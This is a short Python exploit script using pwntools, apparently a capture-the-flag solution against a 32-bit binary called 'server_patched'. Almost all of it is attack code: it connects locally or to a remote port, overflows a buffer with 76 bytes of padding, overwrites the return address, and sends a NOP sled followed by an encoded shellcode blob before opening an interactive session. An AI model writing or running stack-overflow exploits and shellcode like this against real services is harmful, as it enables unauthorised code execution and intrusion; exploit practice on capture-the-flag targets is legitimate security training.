#!/usr/bin/env python3

from pwn import *

exe = ELF("server_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)
    
    buf =  b""
    buf += b"\xdb\xc5\xbb\x72\x5c\xa4\x3a\xd9\x74\x24\xf4\x5f"
    buf += b"\x33\xc9\xb1\x12\x31\x5f\x19\x03\x5f\x19\x83\xc7" 
    buf += b"\x04\x90\xa9\x4f\x0c\xec\x57\x90\x71\x0c\x03\xa1"
    buf += b"\xb8\xc1\x33\x48\xf9\x61\x30\x4b\xfe\x91\xbe\xac"
    buf += b"\x77\x68\x7a\x32\x98\x8a\x7b\xfe\x18\x03\xb9\xb8"
    buf += b"\x1d\x13\x3e\xb9\xa6\x11\x3e\xb9\xd8\xd8\xbe\x01"
    buf += b"\xd9\xe2\xbe\x71\x61\xe2\xbe\x71\x95\x2f\x3e\x99"
    buf += b"\x50\x50\xc0\xa5\x3d\xc2\x5e\x3d\xec\x6e\xd9\xb5"
    buf += b"\xf0"
    r.sendlineafter(b':', b'A'*76 + p32(0x804919f) + b'\x90'*16 + buf)
    r.interactive()


if __name__ == "__main__":
    main()
